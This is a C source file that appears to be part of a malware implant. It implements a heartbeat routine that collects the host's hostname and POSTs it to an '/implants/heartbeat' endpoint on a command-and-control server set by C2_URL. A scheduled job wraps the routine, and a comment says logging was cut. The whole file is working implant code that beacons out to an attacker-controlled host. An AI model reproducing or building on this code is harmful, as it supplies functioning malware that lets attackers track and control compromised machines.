#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "http-client.h"
#include "config.h"
#include "peers.h"
#include <string.h>


void get_my_hostname(char *buf, size_t len) {
    if (gethostname(buf, len) != 0) {
        strncpy(buf, "unknown", len);
    }
}



int send_heartbeat() {
    char hostname[256];
    get_my_hostname(hostname, sizeof(hostname));

    char json_data[512];
    sprintf(json_data, "{\"hostname\":\"%s\", \"port\":\"%d\"}", hostname, 8080);


    char hb_url[256];
    snprintf(hb_url, sizeof hb_url, "%s/implants/heartbeat", C2_URL);


    char *response = NULL;
    int res = http_post(hb_url, json_data, &response);

    if (res != 0) {
        fprintf(stderr, "Failed to send heartbeat: %d\n", res);
        return res;
    }

    // no more logging, it felt too much lmao
    // printf("💓 - Heartbeat sent: %s\n", response);
    // printf("💓 - Heartbeat sent: %s got %zu peers\n", response, global_pl.len);
    fflush(stdout);
    free(response);
    return 0;
}



void heartbeat_job(void *ctx) {
    (void)ctx; // useless context parameter
    send_heartbeat();
}